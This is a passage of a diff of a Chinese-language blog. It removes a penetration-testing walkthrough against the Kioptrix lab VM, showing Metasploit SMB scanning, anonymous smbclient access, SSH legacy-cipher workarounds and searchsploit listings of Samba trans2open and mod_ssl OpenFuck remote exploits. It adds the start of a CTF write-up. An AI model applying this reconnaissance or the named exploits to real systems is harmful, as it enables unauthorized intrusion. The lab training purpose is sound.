    No     Authentication Capture: SMB</span><br><span class="line">   3    post/linux/busybox/smb_share_root                                                   normal     No     BusyBox SMB Sharing</span><br><span class="line">   4    exploit/linux/misc/cisco_rv340_sslvpn                              2022-02-02       good       Yes    Cisco RV340 SSL VPN Unauthenticated Remote Code Execution</span><br><span class="line">   5    auxiliary/scanner/http/citrix_dir_traversal                        2019-12-17       normal     No     Citrix ADC (NetScaler) Directory Traversal Scanner</span><br><span class="line">   6    auxiliary/scanner/smb/impacket/dcomexec                            2018-03-19       normal     No     DCOM Exec</span><br><span class="line">   7    auxiliary/scanner/smb/impacket/secretsdump                                          normal     No     DCOM Exec</span><br><span class="line">   8    auxiliary/scanner/dcerpc/dfscoerce                                                  normal     No     DFSCoerce</span><br><span class="line">   9    exploit/windows/scada/ge_proficy_cimplicity_gefebt                 2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution</span><br><span class="line">   10   exploit/windows/smb/generic_smb_dll_injection                      2015-03-04       manual     No     Generic DLL Injection From Shared Resource</span><br><span class="line">   11   exploit/windows/http/generic_http_dll_injection                    2015-03-04       manual     No     Generic Web Application DLL Injection</span><br><span class="line">   12   exploit/windows/smb/group_policy_startup                           2015-01-26       manual     No     Group Policy Script Execution From Shared Resource</span><br><span class="line">   13   exploit/windows/misc/hp_dataprotector_install_service              2011-11-02       excellent  Yes    HP Data Protector 6.10/6.11/6.20 Install Service</span><br><span class="line">   14   exploit/windows/misc/hp_dataprotector_cmd_exec                     2014-11-02       excellent  Yes    HP Data Protector 8.10 Remote Command Execution</span><br><span class="line">   15   auxiliary/server/http_ntlmrelay                                                     normal     No     HTTP Client MS Credential Relayer</span><br><span class="line">   16   payload/cmd/windows/http/x64/custom/reverse_named_pipe                              normal     No     HTTP Fetch, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   17   payload/cmd/windows/http/x64/meterpreter/reverse_named_pipe                         normal     No     HTTP Fetch, Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   18   payload/cmd/windows/http/x64/peinject/reverse_named_pipe                            normal     No     HTTP Fetch, Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   19   payload/cmd/windows/https/x64/custom/reverse_named_pipe                             normal     No     HTTPS Fetch, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   20   payload/cmd/windows/https/x64/meterpreter/reverse_named_pipe                        no</span><br><span class="line">.....</span><br><span class="line">   99   auxiliary/scanner/smb/smb_login                                                     normal     No     SMB Login Check Scanner</span><br><span class="line">   100  auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                                       normal     No     SMB NTLMv1 Login Request Corruption</span><br><span class="line">   101  auxiliary/fuzzers/smb/smb_negotiate_corrupt                                         normal     No     SMB Negotiate Dialect Corruption</span><br><span class="line">   102  auxiliary/fuzzers/smb/smb2_negotiate_corrupt                                        normal     No     SMB Negotiate SMB2 Dialect Corruption</span><br><span class="line">   103  auxiliary/scanner/smb/smb_lookupsid                                                 normal     No     SMB SID User Enumeration (LookupSid)</span><br><span class="line">   104  auxiliary/admin/smb/check_dir_file                                                  normal     No     SMB Scanner Check File/Directory Utility</span><br><span class="line">   105  auxiliary/scanner/smb/pipe_auditor                                                  normal     No     SMB Session Pipe Auditor</span><br><span class="line">   106  auxiliary/scanner/smb/pipe_dcerpc_auditor                                           normal     No     SMB Session Pipe DCERPC Auditor</span><br><span class="line">   107  auxiliary/scanner/smb/smb_enumshares                                                normal     No     SMB Share Enumeration</span><br><span class="line">   108  auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                      normal     No     SMB Tree Connect Request Corruption</span><br><span class="line">   109  auxiliary/fuzzers/smb/smb_tree_connect                                              normal     No     SMB Tree Connect Request Fuzzer</span><br><span class="line">   110  auxiliary/scanner/smb/smb_enumusers                                                 normal     No     SMB User Enumeration (SAM EnumUsers)</span><br><span class="line">   **111  auxiliary/scanner/smb/smb_version                                                   normal     No     SMB Version Detection**</span><br><span class="line">   112  auxiliary/dos/smb/smb_loris                                        2017-06-29       normal     No     SMBLoris NBSS Denial of Service</span><br><span class="line">   113  exploit/windows/local/cve_2020_0796_smbghost                       2020-03-13       good       Yes    SMBv3 Compression Buffer Overflow</span><br><span class="line">   114  exploit/windows/smb/cve_2020_0796_smbghost                         2020-03-13       average    Yes    SMBv3 Compression Buffer Overflow</span><br><span class="line">   115  auxiliary/scanner/snmp/snmp_enumshares                                              normal     No     SNMP Windows SMB Share Enumeration</span><br><span class="line">   116  auxiliary/admin/smb/samba_symlink_traversal                                         normal     No     Samba Symlink Directory Traversal</span><br><span class="line">   117  auxiliary/scanner/smb/smb_uninit_cred                                               normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State</span><br><span class="line">   118  exploit/linux/samba/chain_reply                                    2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)</span><br><span class="line">   119  auxiliary/dos/samba/read_nttrans_ea_list                                            normal     No     Samba read_nttrans_ea_list Integer Overflow</span><br><span class="line">  ....</span><br><span class="line">   139  payload/windows/peinject/reverse_named_pipe                                         normal     No     Windows Inject PE Files, Windows x86 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   140  payload/windows/x64/peinject/reverse_named_pipe                                     normal     No     Windows Inject Reflective PE Files, Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   141  payload/windows/x64/meterpreter/reverse_named_pipe                                  normal     No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   142  payload/windows/meterpreter/reverse_named_pipe                                      normal     No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager                                                                                                                                                                                 </span><br><span class="line">   143  post/windows/gather/netlm_downgrade                                                 normal     No     Windows NetLM Downgrade Attack</span><br><span class="line">   144  auxiliary/fileformat/multidrop                                                      normal     No     Windows SMB Multi Dropper</span><br><span class="line">   145  payload/windows/x64/custom/reverse_named_pipe                                       normal     No     Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   146  payload/windows/custom/reverse_named_pipe                                           normal     No     Windows shellcode stage, Windows x86 Reverse Named Pipe (SMB) Stager</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看該模塊詳細內容及要填入甚麼參數</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: SMB Version Detection</span><br><span class="line">     Module: auxiliary/scanner/smb/smb_version</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  hdm &lt;x@hdm.io&gt;</span><br><span class="line">  Spencer McIntyre</span><br><span class="line">  Christophe De La Fuente</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name     Current Setting  Required  Description</span><br><span class="line">  ----     ---------------  --------  -----------</span><br><span class="line">  RHOSTS                    <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">  THREADS  1                <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Fingerprint and display version information about SMB servers. Protocol</span><br><span class="line">  information and host operating system (<span class="keyword">if</span> available) will be reported.</span><br><span class="line">  Host operating system detection requires the remote server to support</span><br><span class="line">  version 1 of the SMB protocol. Compression and encryption capability</span><br><span class="line">  negotiation is only present <span class="keyword">in</span> version 3.1.1.</span><br><span class="line"></span><br><span class="line">View the full module info with the info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_version):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   **RHOSTS**                    <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   **THREADS**  1                <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>填入目標機器IP，並進行資訊蒐集</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt;  <span class="built_in">set</span> RHOSTS 192.168.19.140</span><br><span class="line">RHOSTS =&gt; 192.168.19.140</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.19.140:139    - SMB Detected (versions:) (preferred dialect:) (signatures:optional)</span><br><span class="line">[*] 192.168.19.140:139    -   Host could not be identified: Unix (**Samba 2.2.1a**)</span><br><span class="line">[*] 192.168.19.140:       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>看到了SMB版本是<strong>Samba 2.2.1a</strong></p>
-</li>
-<li><p>連線到SMB &gt; <strong>smbclient</strong></p>
-<ul>
-<li><p>發現可以匿名訪問</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **smbclient -L \\\\192.168.19.140\\**</span><br><span class="line">Server does not support EXTENDED_SECURITY  but <span class="string">&#x27;client use spnego = yes&#x27;</span> and <span class="string">&#x27;client ntlmv2 auth = yes&#x27;</span> is <span class="built_in">set</span></span><br><span class="line">Anonymous login successful</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\root]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        IPC$            IPC       IPC Service (Samba Server)</span><br><span class="line">        ADMIN$          IPC       IPC Service (Samba Server)</span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">Server does not support EXTENDED_SECURITY  but <span class="string">&#x27;client use spnego = yes&#x27;</span> and <span class="string">&#x27;client ntlmv2 auth = yes&#x27;</span> is <span class="built_in">set</span></span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line">        KIOPTRIX             Samba Server</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        MYGROUP              KIOPTRIX</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>分別進入文件共享</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# smbclient \\\\192.168.19.140\\ADMIN$   </span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\root]:</span><br><span class="line">Server does not support EXTENDED_SECURITY  but <span class="string">&#x27;client use spnego = yes&#x27;</span> and <span class="string">&#x27;client ntlmv2 auth = yes&#x27;</span> is <span class="built_in">set</span></span><br><span class="line">Anonymous login successful</span><br><span class="line">**tree connect failed: NT_STATUS_WRONG_PASSWORD**</span><br><span class="line">                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# smbclient \\\\192.168.19.140\\IPC$  </span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\root]:</span><br><span class="line">Server does not support EXTENDED_SECURITY  but <span class="string">&#x27;client use spnego = yes&#x27;</span> and <span class="string">&#x27;client ntlmv2 auth = yes&#x27;</span> is <span class="built_in">set</span></span><br><span class="line">Anonymous login successful</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">**NT_STATUS_NETWORK_ACCESS_DENIED listing \***</span><br><span class="line">smb: \&gt; <span class="built_in">help</span></span><br><span class="line">?              allinfo        altname        archive        backup         </span><br><span class="line">blocksize      cancel         case_sensitive <span class="built_in">cd</span>             <span class="built_in">chmod</span>          </span><br><span class="line"><span class="built_in">chown</span>          close          del            deltree        <span class="built_in">dir</span>            </span><br><span class="line"><span class="built_in">du</span>             <span class="built_in">echo</span>           <span class="built_in">exit</span>           get            getfacl        </span><br><span class="line">geteas         hardlink       <span class="built_in">help</span>           <span class="built_in">history</span>        iosize         </span><br><span class="line">lcd            <span class="built_in">link</span>           lock           lowercase      <span class="built_in">ls</span>             </span><br><span class="line">l              mask           md             mget           <span class="built_in">mkdir</span>          </span><br><span class="line">more           mput           newer          notify         open           </span><br><span class="line">posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    </span><br><span class="line">posix_unlink   posix_whoami   <span class="built_in">print</span>          prompt         put            </span><br><span class="line"><span class="built_in">pwd</span>            q              queue          quit           <span class="built_in">readlink</span>       </span><br><span class="line">rd             recurse        reget          rename         reput          </span><br><span class="line"><span class="built_in">rm</span>             <span class="built_in">rmdir</span>          showacls       setea          setmode        </span><br><span class="line">scopy          <span class="built_in">stat</span>           symlink        tar            tarmode        </span><br><span class="line"><span class="built_in">timeout</span>        translate      unlock         volume         vuid           </span><br><span class="line">wdel           logon          listconnect    showconnect    tcon           </span><br><span class="line">tdis           tid            utimes         logoff         ..             </span><br><span class="line">!              </span><br><span class="line">smb: \&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>雖然可以登入IPC但實際上好像無法做甚麼事</p>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="Enumerating-SSH"><a href="#Enumerating-SSH" class="headerlink" title="Enumerating SSH"></a><strong>Enumerating SSH</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br></pre></td></tr></table></figure>
-<p>在登入前，會看到各種 no matching….found 錯誤需要解決一下</p>
-<ul>
-<li>kali機器還有一些遠程訪問問題<ul>
-<li>由於發起遠端存取端的主機openssh版本過高，導致不支援對低版本的遠端連線主機的ssh解密，故報錯誤。</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ssh 192.168.19.140                                              </span><br><span class="line">Unable to negotiate with 192.168.19.140 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1</span><br><span class="line">                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ssh 192.168.19.140 -oKexAlgorithms=+diffie-hellman-group1-sha1      </span><br><span class="line">Unable to negotiate with 192.168.19.140 port 22: no matching host key <span class="built_in">type</span> found. Their offer: ssh-rsa,ssh-dss</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ssh 192.168.19.140 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss </span><br><span class="line">Unable to negotiate with 192.168.19.140 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ssh 192.168.19.140 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc</span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.19.140 (192.168.19.140)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">DSA key fingerprint is SHA256:lEaf2l45SOoTn6qFh/EObfveZjbgCPuTHIXBFtD9mY8.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Please type &#x27;</span><span class="built_in">yes</span><span class="string">&#x27;, &#x27;</span>no<span class="string">&#x27; or the fingerprint: yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.19.140<span class="string">&#x27; (DSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Connection closed by 192.168.19.140 port 22</span></span><br><span class="line"><span class="string">                                                                                                               </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="string">└─# **ssh 192.168.19.140 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc**</span></span><br><span class="line"><span class="string">root@192.168.19.140&#x27;</span>s password:</span><br></pre></td></tr></table></figure>
-<ul>
-<li>全部問題解決才會跳出登入資訊，但可惜我們無法對SSH進行任何遠程訪問，因為不知道密碼，但已經知道了版本，這可能會透漏非常多漏洞資訊</li>
-</ul>
-<h3 id="Researching-Potential-Vulnerabilities"><a href="#Researching-Potential-Vulnerabilities" class="headerlink" title="Researching Potential Vulnerabilities"></a><strong>Researching Potential Vulnerabilities</strong></h3><p>整理當前所發現的問題</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">80/443-192.168.19.140·13:52pm</span><br><span class="line">Default webpage Apache PHP</span><br><span class="line">server header disclose version information</span><br><span class="line">+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) **mod_ssl**/2.8.4 OpenSSL/0.9.6b</span><br><span class="line"></span><br><span class="line">Information Disclosure </span><br><span class="line"></span><br><span class="line">http://192.168.19.140/usage/usage_202402.html - Webalizer Version 2.01</span><br><span class="line"></span><br><span class="line">vuln:</span><br><span class="line">+ **mod_ssl/2.8.4** - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow <span class="built_in">which</span> may allow a remote shell.</span><br><span class="line"></span><br><span class="line">smb:</span><br><span class="line">Unix (**Samba 2.2.1a**)</span><br><span class="line"></span><br><span class="line">ssh:</span><br><span class="line">OpenSSH 2.9p2</span><br></pre></td></tr></table></figure>
-<ul>
-<li>到Google Search相關漏洞資訊<ul>
-<li>80/443 - Potentially vulnerable to OpenLuck<ul>
-<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47080">https://www.exploit-db.com/exploits/47080</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/heltonWernik/OpenLuck">https://github.com/heltonWernik/OpenLuck</a></li>
-</ul>
-</li>
-<li>139 - Potentially vulnerable to trans2open<ul>
-<li><a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-373318/Samba-Samba-2.2.1a.html?page=1&amp;order=1&amp;trc=44&amp;sha=2bf33eb80a56ec8ad382c932e3ec68062fd0afaf">https://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-373318/Samba-Samba-2.2.1a.html?page=1&amp;order=1&amp;trc=44&amp;sha=2bf33eb80a56ec8ad382c932e3ec68062fd0afaf</a><ul>
-<li>尤其針對裡面CVSS評分較高的進行審查</li>
-<li>RCE特別有利用價值</li>
-</ul>
-</li>
-<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/7">https://www.exploit-db.com/exploits/7</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/10">https://www.exploit-db.com/exploits/10</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/samba/trans2open">https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/samba/trans2open</a></li>
-</ul>
-</li>
-<li>22 - Potentially vulnerable to openssh daemon<ul>
-<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/21402">https://www.exploit-db.com/exploits/21402</a></li>
-<li><a target="_blank" rel="noopener" href="https://vulmon.com/searchpage?q=openbsd+openssh+2.9p2">https://vulmon.com/searchpage?q=openbsd+openssh+2.9p2</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-369523/Openbsd-Openssh-2.9p2.html?page=2&amp;order=1&amp;trc=50&amp;sha=55b626a5dcc0fa539f0d435476649fa4d31c9cd7">https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-369523/Openbsd-Openssh-2.9p2.html?page=2&amp;order=1&amp;trc=50&amp;sha=55b626a5dcc0fa539f0d435476649fa4d31c9cd7</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41694">https://www.exploit-db.com/exploits/41694</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>搜索exploit database</p>
-<ul>
-<li><p>searchsploit 去搜索特定版本可利用的腳本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **searchsploit Samba**                                                                                       </span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">....</span><br><span class="line">Samba 2.2.2 &lt; 2.2.6 - <span class="string">&#x27;nttrans&#x27;</span> Remote Buffer Overflow (Metasploit) (1)      | linux/remote/16321.rb</span><br><span class="line">Samba 2.2.8 (BSD x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | bsd_x86/remote/16880.rb</span><br><span class="line">Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalat | linux/local/23674.txt</span><br><span class="line">Samba 2.2.8 (Linux x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)          | linux_x86/remote/16861.rb</span><br><span class="line">Samba 2.2.8 (OSX/PPC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | osx_ppc/remote/16876.rb</span><br><span class="line">Samba 2.2.8 (Solaris SPARC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)      | solaris_sparc/remote/16330.rb</span><br><span class="line">Samba 2.2.8 - Brute Force Method Remote Command Execution                    | linux/remote/55.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (1)                   | unix/remote/22468.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (2)                   | unix/remote/22469.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (3)                   | unix/remote/22470.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (4)                   | unix/remote/22471.txt</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;nttrans&#x27;</span> Remote Overflow (Metasploit)                         | linux/remote/9936.rb</span><br><span class="line">...</span><br><span class="line">Samba 3.5.0 - Remote Code Execution                                          | linux/remote/42060.py</span><br><span class="line">Samba 3.5.0 &lt; 4.4.14/4.5.10/4.6.4 - <span class="string">&#x27;is_known_pipename()&#x27;</span> Arbitrary Module L | linux/remote/42084.rb</span><br><span class="line">Samba 3.5.11/3.6.3 - Remote Code Execution                                   | linux/remote/37834.py</span><br><span class="line">Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                   | linux/dos/27778.txt</span><br><span class="line">Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory     | multiple/remote/41740.txt</span><br><span class="line">Samba &lt; 2.0.5 - Local Overflow                                               | linux/local/19428.c</span><br><span class="line">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                            | multiple/remote/10.c</span><br><span class="line">...</span><br><span class="line">Sambar Server 6.1 Beta 2 - <span class="string">&#x27;showini.asp&#x27;</span> Arbitrary File Access               | windows/remote/24163.txt</span><br><span class="line">Sambar Server 6.1 Beta 2 - <span class="string">&#x27;showperf.asp?title&#x27;</span> Cross-Site Scripting         | windows/remote/24162.txt</span><br><span class="line">SWAT Samba Web Administration Tool - Cross-Site Request Forgery              | cgi/webapps/17577.txt</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **searchsploit mod ssl 2**                                                                                   </span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Apache 2.0.58 mod_rewrite (Windows 2003) - Remote Overflow                   | windows/remote/3996.c</span><br><span class="line">Apache &lt; 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow                   | multiple/remote/2237.sh</span><br><span class="line">Apache mod_rewrite (Windows x86) - Off-by-One Remote Overflow                | windows_x86/remote/3680.sh</span><br><span class="line">....</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - <span class="string">&#x27;OpenFuck.c&#x27;</span> Remote Buffer Overflow         | unix/remote/21671.c</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - <span class="string">&#x27;OpenFuckV2.c&#x27;</span> Remote Buffer Overflow (1)   | unix/remote/764.c</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - <span class="string">&#x27;OpenFuckV2.c&#x27;</span> Remote Buffer Overflow (2)   | unix/remote/47080.c</span><br><span class="line">....</span><br><span class="line">Modbus Slave 7.0.0 - Denial of Service (PoC)                                 | windows/dos/45732.txt</span><br><span class="line">Modbus Slave 7.3.1 - Buffer Overflow (DoS)                                   | windows/dos/50536.py</span><br><span class="line">Modbus Slave PLC 7 - <span class="string">&#x27;.msw&#x27;</span> Buffer Overflow (PoC)                            | windows_x86/local/45710.pl</span><br><span class="line">Veritas/Symantec Backup Exec - SSL NDMP Connection Use-After-Free (Metasploi | windows/remote/42282.rb</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **searchsploit OpenSSH 2.9p2**</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                     | linux/remote/45233.py</span><br><span class="line">OpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)                               | linux/remote/45210.py</span><br><span class="line">OpenSSH &lt; 6.6 SFTP (x64) - Command Execution                                 | linux_x86-64/remote/45000.c</span><br><span class="line">OpenSSH &lt; 6.6 SFTP - Command Execution                                       | linux/remote/45001.py</span><br><span class="line">OpenSSH &lt; 7.4 - <span class="string">&#x27;UsePrivilegeSeparation Disabled&#x27;</span> Forwarded Unix Domain Sock | linux/local/40962.txt</span><br><span class="line">OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                     | linux/remote/40963.txt</span><br><span class="line">OpenSSH &lt; 7.7 - User Enumeration (2)                                         | linux/remote/45939.py</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
-<h3 id="Our-Notes-So-Far"><a href="#Our-Notes-So-Far" class="headerlink" title="Our Notes So Far"></a><strong>Our Notes So Far</strong></h3><p>做個筆記紀錄所找到的資訊</p>
-<p><img src="img/scann_Untitled_13.png" alt="Untitled"></p>
-</li>
-</ul>
-</li>
-</ul>
+        <p><a target="_blank" rel="noopener" href="https://ctf.scist.org/challenges">平台</a><br><img src="https://i.imgur.com/gpHhMXK.png" alt=""></p>
+<h2 id="wELCOME"><a href="#wELCOME" class="headerlink" title="wELCOME"></a>wELCOME</h2><p>F12開起來，FLAG藏裡面<br><img src="https://i.imgur.com/EuX2hiT.png" alt=""></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Intruder-1-3"><a href="#Intruder-1-3" class="headerlink" title="Intruder 1/3"></a>Intruder 1/3</h3><p><img src="https://i.imgur.com/wnhJ6eW.png" alt=""><br>這題的wireshark檔案在過濾後好像是這些奇怪的來源?因為Huge Ports 大埠通訊的來源通常都怪怪的<br><code>dns or ((tcp.srcport &gt;=1024 and tcp.dstport &gt;=1024) and (tcp.flags.syn==1 or tcp.flags.fin==1 or
+tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""><br>後來打算先看看decryption key裡面有沒有其他線索，用IDA反解過去，flag就出來嘞<br><img src="https://i.imgur.com/Q84Ifpy.png" alt=""></p>
+<h3 id="FruteForce"><a href="#FruteForce" class="headerlink" title="FruteForce?"></a>FruteForce?</h3><p><img src="https://i.imgur.com/ffN3pV1.png" alt=""></p>
